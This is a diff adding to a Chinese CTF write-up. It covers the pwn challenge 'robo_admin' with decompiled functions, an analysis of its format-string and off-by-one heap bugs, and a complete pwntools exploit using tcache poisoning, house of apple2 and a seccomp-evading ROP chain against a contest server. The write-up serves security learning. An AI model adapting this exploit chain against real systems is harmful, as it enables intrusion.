@@ -7,6 +7,8 @@ tags:
     - WriteUp
 categories: Contest
 ---
+# 初赛
+
 ## MailSystem
 
 唯一的 pwn
@@ -1084,4 +1086,669 @@ def attack():
 	io.interactive()
 
 attack()
+```
+
+# 区域决赛
+
+## robo_admin
+
+呜呜呜我好菜啊比赛时怎么做不出来呜呜呜
+
+### checksec
+
+```
+[*] '/home/RatherHard/CTF-pwn/ccsssc/robo_admin/题目附件/robo_admin'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+```
+
+### IDA
+
+#### mystart
+
+```c
+__int64 mystart()
+{
+  int v0; // eax
+  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
+  __int64 v3; // [rsp+8h] [rbp-18h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  setvbuf(stdin, 0, 2, 0);
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(stderr, 0, 2, 0);
+  seccomp();
+  clear();
+  pwdgen();
+  puts("Robo Admin Service");
+  while ( 1 )
+  {
+    puts("\n=== Main Menu ===");
+    puts("1. set notice");
+    puts("2. show status");
+    puts("3. admin login");
+    puts("4. exit");
+    puts("> ");
+    *(_QWORD *)nptr = 0;
+    v3 = 0;
+    myread(nptr, 16);
+    v0 = atoi(nptr);
+    if ( v0 == 4 )
+      break;
+    if ( v0 > 4 )
+      goto LABEL_13;
+    switch ( v0 )
+    {
+      case 3:
+        judger = admin_judge();
+        if ( judger )
+          admin_panel();
+        break;
+      case 1:
+        setnotice();
+        break;
+      case 2:
+        showstatus();
+        break;
+      default:
+LABEL_13:
+        puts("[X] invalid");
+        break;
+    }
+  }
+  puts("bye");
+  return 0;
+}
+```
+
+菜单题
+
+#### seccomp
+
+```c
+__int64 seccomp()
+{
+  __int64 v1; // [rsp+8h] [rbp-8h]
+
+  v1 = seccomp_init(2147418112);
+  if ( !v1 )
+    _exit(1);
+  if ( (unsigned int)seccomp_rule_add(v1, 0, 2, 0) )
+    _exit(1);
+  if ( (unsigned int)seccomp_rule_add(v1, 0, 59, 0) )
+    _exit(1);
+  if ( (unsigned int)seccomp_rule_add(v1, 0, 322, 0) )
+    _exit(1);
+  if ( (unsigned int)seccomp_load(v1) )
+    _exit(1);
+  return seccomp_release(v1);
+}
+```
+
+禁用了 open 和 execve ，可以用 openat
+
+#### setnotice
+
+```c
+unsigned __int64 setnotice()
+{
+  _QWORD src[32]; // [rsp+0h] [rbp-310h] BYREF
+  char s[8]; // [rsp+100h] [rbp-210h] BYREF
+  __int64 v3; // [rsp+108h] [rbp-208h]
+  _BYTE v4[496]; // [rsp+110h] [rbp-200h] BYREF
+  unsigned __int64 v5; // [rsp+308h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  *(_QWORD *)s = 0;
+  v3 = 0;
+  memset(v4, 0, sizeof(v4));
+  memset(src, 0, sizeof(src));
+  myread(s, 512);
+  if ( strchr(s, 37) || strchr(s, 36) )
+  {
+    puts("[X] raw input contains illegal chars");
+  }
+  else if ( (unsigned int)((__int64 (__fastcall *)(char *, _QWORD *, __int64))decode)(s, src, 256) )
+  {
+    puts("[X] decode failed");
+  }
+  else
+  {
+    memcpy(notice, src, sizeof(notice));
+    byte_52BF = 0;
+    ntc_tag = 1;
+    puts("[+] notice updated");
+  }
+  return v5 - __readfsqword(0x28u);
+}
+```
+
+禁止明文出现 '%' 和 '$' ，防止直接的格式化字符串攻击
+
+#### decode
+
+```c
+__int64 __fastcall decode(__int64 a1, __int64 a2, unsigned __int64 a3)
+{
+  __int64 v4; // rax
+  __int64 v5; // rax
+  int v7; // [rsp+20h] [rbp-18h]
+  int v8; // [rsp+24h] [rbp-14h]
+  __int64 v9; // [rsp+28h] [rbp-10h]
+  __int64 i; // [rsp+30h] [rbp-8h]
+
+  v9 = 0;
+  for ( i = 0; *(_BYTE *)(a1 + i); ++i )
+  {
+    if ( a3 <= v9 + 1 )
+      return 0xFFFFFFFFLL;
+    if ( *(_BYTE *)(a1 + i) == 92 && *(_BYTE *)(i + 1 + a1) == 120 )
+    {
+      v7 = decodechr((unsigned int)*(char *)(i + 2 + a1));
+      v8 = decodechr((unsigned int)*(char *)(i + 3 + a1));
+      if ( v7 < 0 || v8 < 0 )
+        return 0xFFFFFFFFLL;
+      v4 = v9++;
+      *(_BYTE *)(a2 + v4) = v8 | (16 * v7);
+      i += 3;
+    }
+    else
+    {
+      v5 = v9++;
+      *(_BYTE *)(v5 + a2) = *(_BYTE *)(a1 + i);
+    }
+  }
+  *(_BYTE *)(a2 + v9) = 0;
+  return 0;
+}
+```
+
+解码器没有对格式化字符串的校验，可以利用这一点绕过前面的明文校验
+
+#### showstatus
+
+```c
+unsigned __int64 __fastcall showstatus(__int64 a1, __int64 a2)
+{
+  __int64 v2; // rdx
+  __int64 v3; // rcx
+  __int64 v4; // r8
+  __int64 v5; // r9
+  __int64 v7; // [rsp+0h] [rbp-40h]
+  __int64 v8; // [rsp+8h] [rbp-38h]
+  _QWORD v9[2]; // [rsp+10h] [rbp-30h] BYREF
+  __int64 v10; // [rsp+20h] [rbp-20h]
+  __int64 v11; // [rsp+28h] [rbp-18h]
+  unsigned __int64 v12; // [rsp+38h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  v7 = pwd1;
+  v8 = pwd2;
+  strcpy((char *)v9, "STACK_ANCHOR");
+  BYTE5(v9[1]) = 0;
+  HIWORD(v9[1]) = 0;
+  v10 = 0;
+  v11 = 0;
+  puts("=== Robo Admin Status ===");
+  puts("Robot core: online");
+  puts("Task queue: healthy");
+  printf("Notice: ");
+  if ( ntc_tag )
+  {
+    if ( once )
+    {
+      printf("%s", notice);
+    }
+    else
+    {
+      once = 1;
+      printf(notice, a2, v2, v3, v4, v5, v7, v8, v9[0], v9[1], v10, v11);
+    }
+    puts(&whatelf);
+  }
+  else
+  {
+    puts("(empty)");
+  }
+  return v12 - __readfsqword(0x28u);
+}
+```
+
+有一次格式化字符串利用机会，可以泄露管理员密码和 libc 地址，然后获得进入管理员面板的权限
+
+#### admin_panel
+
+```c
+unsigned __int64 admin_panel()
+{
+  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
+  __int64 v2; // [rsp+8h] [rbp-18h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  while ( 1 )
+  {
+    puts("\n=== Task Menu ===");
+    puts("1. create");
+    puts("2. edit");
+    puts("3. query");
+    puts("4. list");
+    puts("5. delete");
+    puts("6. logout");
+    puts("> ");
+    *(_QWORD *)nptr = 0;
+    v2 = 0;
+    myread(nptr, 16);
+    switch ( atoi(nptr) )
+    {
+      case 1:
+        create();
+        break;
+      case 2:
+        edit();
+        break;
+      case 3:
+        query();
+        break;
+      case 4:
+        list();
+        break;
+      case 5:
+        delete();
+        break;
+      case 6:
+        return v3 - __readfsqword(0x28u);
+      default:
+        puts("[X] invalid");
+        break;
+    }
+  }
+}
+```
+
+经典菜单堆题
+
+#### create
+
+```c
+int create()
+{
+  size_t v0; // rax
+  __int64 v1; // rax
+  unsigned int v3; // [rsp+4h] [rbp-Ch]
+  size_t size; // [rsp+8h] [rbp-8h]
+
+  LODWORD(v0) = readidx();
+  v3 = v0;
+  if ( (v0 & 0x80000000) == 0LL )
+  {
+    if ( taskalive[(int)v0] )
+    {
+      LODWORD(v0) = puts("[X] slot used");
+    }
+    else
+    {
+      memset((char *)&task_name + 24 * (int)v0, 0, 0x18u);
+      puts("Task name:");
+      v1 = (__int64)taskname_getptr(v3);
+      myread((void *)v1, 16);
+      v0 = readnum("Desc size:", 24, 0x200);
+      size = v0;
+      if ( v0 )
+      {
+        task_desc[v3] = malloc(v0);
+        if ( task_desc[v3] )
+        {
+          memset((void *)task_desc[v3], 0, size);
+          task_size[v3] = size;
+          *(_QWORD *)taskname_getptr_0x10(v3) = 0;
+          taskalive[v3] = 1;
+          LODWORD(v0) = puts("[+] task created");
+        }
+        else
+        {
+          LODWORD(v0) = puts("[X] malloc failed");
+        }
+      }
+    }
+  }
+  return v0;
+}
+```
+
+可申请大小 200 以内任意 chunk ，同时可控 7 个 chunk
+
+#### edit
+
+```c
+int edit()
+{
+  __int64 v0; // rax
+  unsigned __int64 v1; // r12
+  ssize_t v2; // rbx
+  ssize_t *v3; // rax
+  unsigned int v5; // [rsp+Ch] [rbp-24h]
+  size_t nbytes; // [rsp+10h] [rbp-20h]
+  ssize_t v7; // [rsp+18h] [rbp-18h]
+
+  LODWORD(v0) = readidx();
+  v5 = v0;
+  if ( (int)v0 >= 0 )
+  {
+    if ( taskalive[(int)v0] )
+    {
+      v0 = readnum("Write length :", 1, task_size[(int)v0] + 1LL);
+      nbytes = v0;
+      if ( v0 )
+      {
+        puts("New desc bytes:");
+        v7 = read(0, *((void **)&task_desc + (int)v5), nbytes);
+        if ( v7 > 0 )
+        {
+          if ( task_size[v5] <= (unsigned __int64)v7 )
+          {
+            if ( task_size[v5] )
+              *(_BYTE *)(*((_QWORD *)&task_desc + (int)v5) + task_size[v5] - 1LL) = 0;
+          }
+          else
+          {
+            *(_BYTE *)(*((_QWORD *)&task_desc + (int)v5) + v7) = 0;
+          }
+          v1 = task_size[v5];
+          v2 = v7;
+          v3 = (ssize_t *)taskname_getptr_0x10(v5);
+          if ( v1 <= v7 )
+            v2 = v1;
+          *v3 = v2;
+          LODWORD(v0) = puts("[+] task updated");
+        }
+        else
+        {
+          LODWORD(v0) = puts("[X] read failed");
+        }
+      }
+    }
+    else
+    {
+      LODWORD(v0) = puts("[X] empty");
+    }
+  }
+  return v0;
+}
+```
+
+发现 off-by-one 漏洞，然后 写入的内容末尾会补一个 '\x00' ，阻挠进一步的泄露
+
+#### delete
+
+```c
+int delete()
+{
+  int result; // eax
+  int v1; // [rsp+Ch] [rbp-4h]
+
+  result = readidx();
+  v1 = result;
+  if ( result >= 0 )
+  {
+    if ( taskalive[result] )
+    {
+      free((void *)task_desc[result]);
+      task_desc[v1] = 0;
+      task_size[v1] = 0;
+      memset((char *)&task_name + 24 * v1, 0, 0x18u);
+      taskalive[v1] = 0;
+      return puts("[+] deleted");
+    }
+    else
+    {
+      return puts("[X] empty");
+    }
+  }
+  return result;
+}
+```
+
+没有 UAF
+
+### 攻击思路
+
+利用格式化字符串获取管理员权限后，就是 off-by-one 的利用了
+
+准备三个相邻 chunk A, B, C ，从低地址到高地址排列
+
+利用 A 的 off-by-one 漏洞使 B 恰好包括住 C ，然后 free 掉 B 使之进入 unsortedbin
+
+申请原来的 B 的大小的 chunk ，使 unsortedbin 剩下 lastremainder C ，然后再申请 C 的大小，这样就获得了两个指向同一个 chunk 的堆指针
+
+最后 free 掉其中一个指针，就可以达成 UAF 的效果，leak heap 后用 tcache poisoning 打 house of apple2 写 orw 链即可
+
+不过 chunk 的大小还要精心选择一波，在开始利用之前需要做一下堆风水使 B 能进入 unsortedbin
+
+吐槽一下这初始的堆环境是有够恶劣的。。。
+
+### exp
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+context.arch = 'amd64'
+context.os = 'linux'
+context.terminal = ['tmux', 'splitw', '-h']
+
+debug = 1
+
+file = './robo_admin_patched'
+elf = ELF(file)
+libc = ELF('./libc.so.6')
+
+target = '60.205.163.215'
+port = 13774
+
+if debug:
+    p = process(file)
+else:
+    p = remote(target, port)
+
+io = p
+
+def dbg(cmd = ''):
+    if debug:
+        gdb.attach(p, gdbscript = cmd)
+
+s       = lambda data           :p.send(data)
+sl      = lambda data           :p.sendline(data)
+sa      = lambda x, data        :p.sendafter(x, data)
+sla     = lambda x, data        :p.sendlineafter(x, data)
+r       = lambda num=4096       :p.recv(num)
+rl      = lambda num=4096       :p.recvline(num)
+ru      = lambda x              :p.recvuntil(x)
+itr     = lambda                :p.interactive()
+uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
+uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
+uru64   = lambda                :uu64(ru('\x7f')[-6:])
+leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))
+
+def encoder(text):
+    result = str()
+    for i in text:
+        if i == '%' or i == '$':
+            result += '\\' + hex(ord(i))[1:]
+        else:
+            result += i
+    return result.encode()
+
+def safelinking(pos, ptr):
+    return (pos >> 12) ^ ptr
+
+def decodenext(x):
+    a = x
+    for _ in range(12):
+        x = a ^ (x >> 12)
+    return x
+
+def setnotice(notice):
+    sla(b'> \n', b'1')
+    s(notice)
+
+def showstatus():
+    sla(b'> \n', b'2')
+
+def admin_login(pwd):
+    sla(b'> \n', b'3')
+    sa(b'Token:\n', b'ROBOADMIN')
+    sa(b'Password (32 hex):\n', pwd)
+
+def exit():
+    sla(b'> \n', b'4')
+
+def createtask(idx, name, size):
+    sla(b'> \n', b'1')
+    sla(b'Index:\n', str(idx).encode())
+    sa(b'name:\n', name)
+    sla(b'size:\n', str(size).encode())
+
+def edittask(idx, length, content):
+    sla(b'> \n', b'2')
+    sla(b'Index:\n', str(idx).encode())
+    sa(b'length :\n', str(length).encode())
+    sla(b'bytes:\n', content)
+
+def querytask(idx):
+    sla(b'> \n', b'3')
+    sla(b'Index:\n', str(idx).encode())
+
+def deletetask(idx):
+    sla(b'> \n', b'5')
+    sla(b'Index:\n', str(idx).encode())
+
+def logout():
+    sla(b'> \n', b'6')
+
+setnotice(encoder('%6$016p%7$016p%23$p'))    # leak pwd, libc
+showstatus()
+ru(b'Notice: ')
+r(2)
+pwd = r(16)
+r(2)
+pwd += r(16)
+r(2)
+libc.address = int(r(12).decode('utf-8'), 16) - 0x29d90
+leak('libc.address')
+admin_login(pwd)
+
+createtask(0, b'WWW', 0x48)    # init_chunk
+createtask(1, b'WWW', 0x48)
+createtask(2, b'WWW', 0x48)
+deletetask(0)
+deletetask(1)
+deletetask(2)
+
+for i in range(7):    # fill tcache
+    createtask(i, str(i).encode(), 0x1d8)
+for i in range(7):
+    deletetask(i)
+
+createtask(0, b'AAA', 0xd8)    # build overlap
+createtask(1, b'AAA', 0xf8)
+createtask(2, b'AAA', 0xd8)
+createtask(3, b'AAA', 0xd8)
+payload = b'A' * 0xd8 + b'\xe1'
+edittask(0, 0xd9, payload)
+deletetask(1)
+createtask(1, b'AAA', 0xf8)
+deletetask(1)
+createtask(1, b'AAA', 0xd8)
+deletetask(3)
+deletetask(1)
+
+querytask(2)    # leak heap
+ru(b' => ')
+heap = decodenext(uu64(r(6))) - 0x2940
+leak('heap')
+
+payload = p64(safelinking(heap + 0x2000, heap + 0xf0))    # tcache poisoning
+edittask(2, 0x8, payload)
+createtask(3, b'AAA', 0xd8)
+createtask(4, b'AAA', 0xd8)
+stderr = libc.symbols['_IO_2_1_stderr_']
+payload = p64(stderr) + p64(stderr)
+edittask(4, 0x16, payload)
+
+createtask(6, b'BBB', 0xe0)    # house of apple2
+fake_io = flat({
+        0x0: 0,
+        0x10: b'flag\x00',
+        0x28: libc.sym['setcontext'] + 0x3d,
+        0x38: 0, # RDI
+        0x40: stderr + 0x20, # RSI
+        0x58: 0x400, # RDX
+        0x70: stderr + 0x20, # RSP
+        0X78: libc.sym['read'], # RIP
+        0x88: stderr,
+        0xA0: stderr - 0x30, # __rdx__
+        0xB0: stderr - 0x40,
+        0xD8: libc.sym['_IO_wfile_jumps']
+    },
+    filler=b"\x00"
+)
+edittask(6, 0xe0, fake_io)
+logout()
+exit()
+
+pop_rax_ret = libc.address + 0x45eb0
+pop_rdi_ret = libc.address + 0x2a3e5
+pop_rsi_ret = libc.address + 0x2be51
+pop_rdx_pop_r12_ret = libc.address + 0x11f367
+syscall_ret = libc.address + 0x91316
+
+rop_chain = flat([
+    pop_rax_ret,
+    257,
+    pop_rdi_ret,
+    -100,
+    pop_rsi_ret,
+    stderr + 0x10,
+    pop_rdx_pop_r12_ret,
+    0x100,
+    0,
+    syscall_ret,		# openat(-100, "flag", 0)
+    pop_rax_ret,
+    0,
+    pop_rdi_ret,
+    3,
+    pop_rsi_ret,
+    stderr + 0x400,
+    pop_rdx_pop_r12_ret,
+    0x100,
+    0,
+    syscall_ret,		# read(3, buf, 0x100)
+    pop_rax_ret,
+    1,
+    pop_rdi_ret,
+    1,
+    pop_rsi_ret,
+    stderr + 0x400,
+    pop_rdx_pop_r12_ret,
+    0x100,
+    0,
+    syscall_ret		# write(1, buf, 0x100)
+])
+
+sla(b'bye', rop_chain)
+
+itr()
+
+# 0x0000000000045eb0: pop rax; ret;
+# 0x000000000002a3e5: pop rdi; ret;
+# 0x000000000002be51: pop rsi; ret;
+# 0x000000000011f367: pop rdx; pop r12; ret;
+# 0x0000000000091316: syscall; ret;
 ```
